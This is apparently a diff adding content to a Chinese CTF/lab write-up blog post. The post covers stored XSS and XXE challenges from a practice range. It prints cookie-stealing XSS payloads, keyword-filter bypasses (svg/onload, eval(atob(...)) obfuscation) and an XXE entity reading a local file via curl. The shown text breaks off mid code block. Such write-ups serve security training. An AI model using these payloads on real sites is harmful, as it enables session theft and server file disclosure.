@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 终于到最后了，累/(ㄒoㄒ)/~~\nEZXSS EZXSS EZXSS_1 EZXSS_2 EZXXE EZXXE EZXXE_1 EZXXE_2 EZXXE_3 EZSSRF EZSSRF EZSSRF_1 EZSSRF_2 EZSSRF_3 EZSSRF_4 EZSSRF_5 EZSSRF_6 EZJWT EZJWT EZJWT_1 EZJWT_2 EZPOP EZPOP EZPOP_1 EZPOP_2 EZPOP_3 EZPOP_4 EZPOP_5 EZPOP_6 EZPOP_7 EZPOP_8 ">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言 到最后了，/(ㄒoㄒ)/~~\nEZXSS EZXSS（存储型 XSS） 漏洞类型： 存储型 XSS（Stored Cross-Site Scripting）\n题目分析：\n目标是一个技术博客网站，包含搜索框和留言板功能。经测试：\n">
 <title>QingCen靶场Web入门wp 下</title>
 
 <link rel='canonical' href='https://blog.xxchenchen.top/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp-%E4%B8%8B/'>
 
 <link rel="stylesheet" href="/scss/style.min.792c36f70fdd2d82eb85abdd638d265195c5df1693f8163637a98cf447af6d36.css"><meta property='og:title' content="QingCen靶场Web入门wp 下">
-<meta property='og:description' content="前言 终于到最后了，累/(ㄒoㄒ)/~~\nEZXSS EZXSS EZXSS_1 EZXSS_2 EZXXE EZXXE EZXXE_1 EZXXE_2 EZXXE_3 EZSSRF EZSSRF EZSSRF_1 EZSSRF_2 EZSSRF_3 EZSSRF_4 EZSSRF_5 EZSSRF_6 EZJWT EZJWT EZJWT_1 EZJWT_2 EZPOP EZPOP EZPOP_1 EZPOP_2 EZPOP_3 EZPOP_4 EZPOP_5 EZPOP_6 EZPOP_7 EZPOP_8 ">
+<meta property='og:description' content="前言 到最后了，/(ㄒoㄒ)/~~\nEZXSS EZXSS（存储型 XSS） 漏洞类型： 存储型 XSS（Stored Cross-Site Scripting）\n题目分析：\n目标是一个技术博客网站，包含搜索框和留言板功能。经测试：\n">
 <meta property='og:url' content='https://blog.xxchenchen.top/p/qingcen%E9%9D%B6%E5%9C%BAweb%E5%85%A5%E9%97%A8wp-%E4%B8%8B/'>
 <meta property='og:site_name' content='ChenOvo'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='wp' /><meta property='article:tag' content='web' /><meta property='article:published_time' content='2026-04-28T15:34:32&#43;08:00'/><meta property='article:modified_time' content='2026-04-28T15:34:32&#43;08:00'/><meta property='og:image' content='https://blog.xxchenchen.top/img/qingcenctf-cover.svg' />
 <meta name="twitter:title" content="QingCen靶场Web入门wp 下">
-<meta name="twitter:description" content="前言 终于到最后了，累/(ㄒoㄒ)/~~\nEZXSS EZXSS EZXSS_1 EZXSS_2 EZXXE EZXXE EZXXE_1 EZXXE_2 EZXXE_3 EZSSRF EZSSRF EZSSRF_1 EZSSRF_2 EZSSRF_3 EZSSRF_4 EZSSRF_5 EZSSRF_6 EZJWT EZJWT EZJWT_1 EZJWT_2 EZPOP EZPOP EZPOP_1 EZPOP_2 EZPOP_3 EZPOP_4 EZPOP_5 EZPOP_6 EZPOP_7 EZPOP_8 "><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="前言 到最后了，/(ㄒoㄒ)/~~\nEZXSS EZXSS（存储型 XSS） 漏洞类型： 存储型 XSS（Stored Cross-Site Scripting）\n题目分析：\n目标是一个技术博客网站，包含搜索框和留言板功能。经测试：\n"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://blog.xxchenchen.top/img/qingcenctf-cover.svg' />
     <link rel="shortcut icon" href="/favicon.png" />
 <link rel="stylesheet" href="/css/custom.css">
@@ -293,17 +293,17 @@
     <li><a href="#前言">前言</a></li>
     <li><a href="#ezxss">EZXSS</a>
       <ol>
-        <li><a href="#ezxss-1">EZXSS</a></li>
-        <li><a href="#ezxss_1">EZXSS_1</a></li>
-        <li><a href="#ezxss_2">EZXSS_2</a></li>
+        <li><a href="#ezxss存储型-xss">EZXSS（存储型 XSS）</a></li>
+        <li><a href="#ezxss_1存储型-xss--标签属性过滤绕过">EZXSS_1（存储型 XSS + 标签/属性过滤绕过）</a></li>
+        <li><a href="#ezxss_2存储型-xss--多重过滤绕过">EZXSS_2（存储型 XSS + 多重过滤绕过）</a></li>
       </ol>
     </li>
     <li><a href="#ezxxe">EZXXE</a>
       <ol>
-        <li><a href="#ezxxe-1">EZXXE</a></li>
-        <li><a href="#ezxxe_1">EZXXE_1</a></li>
-        <li><a href="#ezxxe_2">EZXXE_2</a></li>
-        <li><a href="#ezxxe_3">EZXXE_3</a></li>
+        <li><a href="#ezxxe基础-xxe-文件读取">EZXXE（基础 XXE 文件读取）</a></li>
+        <li><a href="#ezxxe_1svg-文件上传-xxe">EZXXE_1（SVG 文件上传 XXE）</a></li>
+        <li><a href="#ezxxe_2xxe--waf-关键词过滤绕过">EZXXE_2（XXE + WAF 关键词过滤绕过）</a></li>
+        <li><a href="#ezxxe_3-盲-xxe--oob-外带">EZXXE_3 盲 XXE + OOB 外带</a></li>
       </ol>
     </li>
     <li><a href="#ezssrf">EZSSRF</a>
@@ -464,7 +464,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 1 分钟
+                    阅读时长: 7 分钟
                 </time>
             </div>
         
@@ -481,7 +481,7 @@
 
 
 
-                <span class="article-time--wordcount">50 字</span>
+                <span class="article-time--wordcount">3392 字</span>
             </div>
         
     </footer>
@@ -496,17 +496,616 @@
     
     
     <h2 id="前言">前言
-</h2><p>终于到最后了，累/(ㄒoㄒ)/~~</p>
+</h2><p>到最后了，/(ㄒoㄒ)/~~</p>
 <h2 id="ezxss">EZXSS
-</h2><h3 id="ezxss-1">EZXSS
-</h3><h3 id="ezxss_1">EZXSS_1
-</h3><h3 id="ezxss_2">EZXSS_2
-</h3><h2 id="ezxxe">EZXXE
-</h2><h3 id="ezxxe-1">EZXXE
-</h3><h3 id="ezxxe_1">EZXXE_1
-</h3><h3 id="ezxxe_2">EZXXE_2
-</h3><h3 id="ezxxe_3">EZXXE_3
-</h3><h2 id="ezssrf">EZSSRF
+</h2><h3 id="ezxss存储型-xss">EZXSS（存储型 XSS）
+</h3><p><strong>漏洞类型：</strong> 存储型 XSS（Stored Cross-Site Scripting）</p>
+<p><strong>题目分析：</strong></p>
+<p>目标是一个技术博客网站，包含搜索框和留言板功能。经测试：</p>
+<ul>
+<li>搜索框对输入做了 HTML 转义（<code>&lt;</code> → <code>&amp;lt;</code>），反射型 XSS 不可行</li>
+<li>留言板（<code>/guestbook</code>）直接将用户输入渲染到 HTML 中，<strong>无任何过滤和转义</strong></li>
+<li>页面无 CSP 头，XSS 可自由执行</li>
+<li><code>/flag</code> 端点返回 404，说明 flag 在 admin 的 cookie 中</li>
+<li>主页有清除 cookie 的 JS 脚本，但留言板页面没有</li>
+</ul>
+<p><strong>攻击思路：</strong> 提交 XSS payload → admin bot 访问留言板审核 → XSS 在 admin 浏览器中执行 → 窃取 admin cookie → 回传到留言板</p>
+<p><strong>关键发现：</strong> <code>&lt;script&gt;</code> 标签在 innerHTML 插入的 HTML 中<strong>不会执行</strong>，必须使用 <code>&lt;img onerror&gt;</code> 等事件处理器触发 JS。</p>
+<p><strong>Step 1：测试搜索框（反射型 XSS 不可行）</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://target/?q=&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span><span class="line"><span class="cl"># 输出被转义为 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：测试留言板（存储型 XSS 确认）</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /guestbook HTTP/1.1
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">content=&lt;b&gt;bold&lt;/b&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x onerror=alert(2)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>页面渲染结果：<code>&lt;b&gt;</code> 标签生效，<code>&lt;script&gt;</code> 不执行，<code>&lt;img onerror&gt;</code> 触发弹窗。</p>
+<p><strong>Step 3：提交 XSS Payload 窃取 Admin Cookie</strong></p>
+<p>使用 <code>img onerror</code> + <code>fetch</code> 将 admin cookie 回传到留言板。注意引号嵌套：<code>onerror</code> 属性用双引号包裹，内部 JS 字符串用单引号。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;img src=x onerror=&#34;fetch(&#39;/guestbook&#39;,{method:&#39;POST&#39;,headers:{&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded&#39;},body:&#39;content=FLAG:&#39;+document.cookie})&#34;&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 4：等待 Admin Bot 访问，刷新留言板获取 Flag</strong></p>
+<p>Admin bot 定期访问 <code>/guestbook</code> 审核留言，浏览器执行 <code>onerror</code> 中的 JS：</p>
+<ol>
+<li>读取 <code>document.cookie</code> → <code>flag=flag{xxx}</code></li>
+<li>POST 到 <code>/guestbook</code> → <code>content=FLAG:flag{flag{xxx}}</code></li>
+</ol>
+<p>刷新留言板即可看到回传的 flag。</p>
+<p><strong>Flag：</strong> <code>flag{6d73dd52-37ae-4b9c-9020-c6b5dff252af}</code></p>
+<h3 id="ezxss_1存储型-xss--标签属性过滤绕过">EZXSS_1（存储型 XSS + 标签/属性过滤绕过）
+</h3><p><strong>漏洞类型：</strong> 存储型 XSS（Stored Cross-Site Scripting）+ 过滤绕过</p>
+<p><strong>题目分析：</strong></p>
+<p>与 EZXSS 基础题相同的网站结构，但增加了 WAF 过滤：</p>
+<ul>
+<li>搜索框 HTML 转义，反射型 XSS 不可行</li>
+<li>留言板存储型 XSS，但服务端对输入进行了关键词过滤</li>
+<li>无 CSP 头</li>
+</ul>
+<p><strong>过滤测试：</strong></p>
+<p>经逐步测试，以下关键词/标签被过滤：</p>
+<ul>
+<li><code>&lt;script&gt;</code> 标签 → 过滤</li>
+<li><code>&lt;img&gt;</code> 标签 → 过滤</li>
+<li><code>&lt;body&gt;</code> 标签 → 过滤（同时影响 fetch 的 <code>body</code> 属性名）</li>
+<li><code>&lt;iframe&gt;</code> 标签 → 过滤</li>
+</ul>
+<p>以下标签可用：</p>
+<ul>
+<li><code>&lt;svg&gt;</code> ✓</li>
+<li><code>&lt;input&gt;</code> ✓</li>
+<li><code>&lt;details&gt;</code> ✓</li>
+</ul>
+<p><strong>绕过思路：</strong></p>
+<ol>
+<li>标签绕过：用 <code>&lt;svg onload&gt;</code> 替代 <code>&lt;img onerror&gt;</code></li>
+<li>body 属性绕过：用 <code>XMLHttpRequest.send()</code> 替代 fetch 的 body，或用属性名拼接 <code>['bo'+'dy']</code></li>
+</ol>
+<p><strong>Step 1：测试过滤规则</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 测试哪些标签被过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>     <span class="c1"># ✗ 被过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="n">x</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>  <span class="c1"># ✗ 被过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>         <span class="c1"># ✓ 可用</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">input</span> <span class="n">onfocus</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">autofocus</span><span class="o">&gt;</span>  <span class="c1"># ✓ 可用</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：绕过 body 属性过滤 — 方法1 XMLHttpRequest</strong></p>
+<p>用 <code>XMLHttpRequest.send()</code> 替代 fetch 的 body 属性，完全避免使用 <code>body</code> 关键词：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="s2">&#34;var x=new XMLHttpRequest();x.open(&#39;POST&#39;,&#39;/guestbook&#39;);x.setRequestHeader(&#39;Content-Type&#39;,&#39;application/x-www-form-urlencoded&#39;);x.send(&#39;content=FLAG:&#39;+encodeURIComponent(document.cookie))&#34;</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 3：绕过 body 属性过滤 — 方法2 属性名拼接</strong></p>
+<p>仍然使用 fetch，但用 <code>['bo'+'dy']</code> 拼接绕过 body 关键词检测：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="s2">&#34;fetch(&#39;/guestbook&#39;,{method:&#39;POST&#39;,headers:{&#39;Content-Type&#39;:&#39;application/x-www-form-urlencoded&#39;},[&#39;bo&#39;+&#39;dy&#39;]:&#39;content=FLAG:&#39;+encodeURIComponent(document.cookie)})&#34;</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 4：提交 payload 并获取 flag</strong></p>
+<p>多提交几次，等待 admin bot 访问留言板触发 XSS，刷新页面即可看到回传的 flag。</p>
+<p><strong>Flag：</strong> <code>flag{36708ba7-72e9-4f53-8778-25d7933bbaa9}</code></p>
+<h3 id="ezxss_2存储型-xss--多重过滤绕过">EZXSS_2（存储型 XSS + 多重过滤绕过）
+</h3><p><strong>漏洞类型：</strong> 存储型 XSS（Stored Cross-Site Scripting）+ 多重过滤绕过</p>
+<p><strong>题目分析：</strong></p>
+<p>在 EZXSS_1 基础上增加了更严格的 WAF：</p>
+<ul>
+<li><code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;body&gt;</code> 标签过滤</li>
+<li><code>var</code>、<code>body</code>、<code>new Image</code> 等关键词过滤</li>
+<li>事件处理器与标签之间有空格时被过滤（如 <code>&lt;svg onload=...&gt;</code>）</li>
+<li>HTML 中的 <code>&gt;</code> 会截断属性值</li>
+</ul>
+<p><strong>过滤测试：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 标签过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">script</span><span class="o">&gt;</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>      <span class="c1"># ✗ 被过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="n">x</span> <span class="n">onerror</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>   <span class="c1"># ✗ 被过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span> <span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>          <span class="c1"># ✗ 空格被检测</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>          <span class="c1"># ✓ 用 / 替代空格绕过</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 关键词过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="k">var</span> <span class="n">x</span><span class="o">=</span><span class="mi">1</span><span class="o">&gt;</span>           <span class="c1"># ✗ var 被过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="n">body</span><span class="o">&gt;</span>              <span class="c1"># ✗ body 被过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="n">x</span><span class="o">=</span><span class="mi">1</span><span class="o">&gt;</span>              <span class="c1"># ✓ 可用</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="n">atob</span><span class="p">(</span><span class="s1">&#39;...&#39;</span><span class="p">))</span><span class="o">&gt;</span> <span class="c1"># ✓ 可用</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>绕过思路：</strong></p>
+<ol>
+<li>标签绕过：<code>&lt;svg/onload&gt;</code> 用 <code>/</code> 替代空格绕过检测</li>
+<li>body 属性绕过：用 <code>XMLHttpRequest.send()</code> 替代 fetch 的 body</li>
+<li>特殊字符绕过：用 <code>eval(atob('base64'))</code> 避免 <code>&gt;</code> 截断 HTML 属性</li>
+</ol>
+<p><strong>Step 1：确认过滤规则</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># 测试 / 分隔符绕过空格检测</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="n">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 测试 eval+atob 绕过特殊字符</span>
+</span></span><span class="line"><span class="cl"><span class="n">content</span><span class="o">=&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="n">atob</span><span class="p">(</span><span class="s1">&#39;YWxlcnQoMSk=&#39;</span><span class="p">))</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 2：构造 Payload — XMLHttpRequest + eval(atob(&hellip;))</strong></p>
+<p>JS 代码（避免 <code>var</code>、<code>body</code> 关键词）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">x</span><span class="o">=</span><span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="nx">x</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span><span class="s1">&#39;/guestbook&#39;</span><span class="p">);</span><span class="nx">x</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">);</span><span class="nx">x</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;content=FLAG:&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Base64 编码后用 <code>eval(atob(...))</code> 执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="n">eval</span><span class="p">(</span><span class="n">atob</span><span class="p">(</span><span class="s1">&#39;eD1uZXcgWE1MSHR0cFJlcXVlc3QoKTt4Lm9wZW4oJ1BPU1QnLCcvZ3Vlc3Rib29rJyk7eC5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQnKTt4LnNlbmQoJ2NvbnRlbnQ9RkxBRzonK2RvY3VtZW50LmNvb2tpZSk=&#39;</span><span class="p">))</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Step 3：提交 payload 并获取 flag</strong></p>
+<p>多提交几次，等待 admin bot 访问触发 XSS。</p>
+<p><strong>Flag：</strong> <code>flag{26d8fef3-2dc5-45fe-ba10-902b6ea939c2}</code></p>
+<h2 id="ezxxe">EZXXE
+</h2><h3 id="ezxxe基础-xxe-文件读取">EZXXE（基础 XXE 文件读取）
+</h3><p><strong>漏洞类型：</strong> XML 外部实体注入（XXE - XML External Entity Injection）— 本地文件读取</p>
+<p><strong>题目分析：</strong></p>
+<p>目标是一个 XML 解析服务，页面包含一个表单，用户输入 XML 内容后提交到 <code>xml.php</code> 进行解析，解析结果直接回显在页面上。</p>
+<p>关键点：</p>
+<ul>
+<li>表单提交到 <code>xml.php</code>，POST 方法，参数名为 <code>contract</code></li>
+<li>服务端使用 XML 解析器处理用户输入</li>
+<li>解析结果直接回显，无过滤</li>
+<li>未禁用外部实体加载</li>
+</ul>
+<p><strong>攻击思路：</strong> 构造 XML 外部实体 → 引用本地文件 <code>file:///flag</code> → 服务端解析时读取文件内容 → 回显 flag</p>
+<p><strong>Step 1：分析页面结构</strong></p>
+<p>页面有一个 textarea 表单，默认内容为 XML 声明：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>提交到 <code>xml.php</code>，解析结果显示在 <code>&lt;pre id=&quot;output&quot;&gt;</code> 中。</p>
+<p><strong>Step 2：构造 XXE Payload 读取 /flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;!DOCTYPE foo [
+</span></span><span class="line"><span class="cl">  &lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;
+</span></span><span class="line"><span class="cl">]&gt;
+</span></span><span class="line"><span class="cl">&lt;root&gt;&amp;xxe;&lt;/root&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>原理说明：</p>
+<ul>
+<li><code>&lt;!DOCTYPE foo [...]&gt;</code> 定义文档类型，内部声明外部实体</li>
+<li><code>&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;</code> 声明一个外部实体 <code>xxe</code>，指向本地文件 <code>/flag</code></li>
+<li><code>&lt;root&gt;&amp;xxe;&lt;/root&gt;</code> 在 XML 中引用该实体，解析器会将其替换为文件内容</li>
+</ul>
+<p><strong>Step 3：提交 Payload 获取 Flag</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST <span class="s2">&#34;http://target/xml.php&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -H <span class="s2">&#34;Content-Type: application/x-www-form-urlencoded&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --data-urlencode <span class="s1">&#39;contract=&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;!DOCTYPE foo [
+</span></span></span><span class="line"><span class="cl"><span class="s1">  &lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">]&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">&lt;root&gt;&amp;xxe;&lt;/root&gt;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Flag：</strong> <code>flag{b8107160-86f1-4998-9489-4a4fafdc97c4}</code></p>
+<h3 id="ezxxe_1svg-文件上传-xxe">EZXXE_1（SVG 文件上传 XXE）
+</h3><p><strong>漏洞类型：</strong> XML 外部实体注入（XXE）— SVG 文件上传触发</p>
+<p><strong>题目分析：</strong></p>
+<p>与 EZXXE 不同，本题不是直接输入 XML，而是通过 SVG 文件上传触发 XXE：</p>
+<ul>
+<li>页面是 SVG Vector Viewer，接受 <code>.svg</code> 文件上传</li>
+<li>表单使用 <code>multipart/form-data</code> 编码</li>
+<li>服务端解析 SVG 文件并提取元数据（尺寸、描述等）</li>
+<li>SVG 是基于 XML 的格式，可在其中嵌入 XXE payload</li>
+</ul>
+<p><strong>攻击思路：</strong> 构造恶意 SVG 文件 → 嵌入 XXE 外部实体 → 上传到服务端 → 服务端解析 SVG 时读取本地文件 → 返回文件内容</p>
+<p><strong>关键发现：</strong> 服务端解析 SVG 后提取 <code>&lt;desc&gt;</code> 标签内容作为 &ldquo;Analysis Result&rdquo; 显示，因此 flag 需要通过 <code>&lt;desc&gt;</code> 标签输出。</p>
+<p><strong>Step 1：分析上传功能</strong></p>
+<p>页面表单结构：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
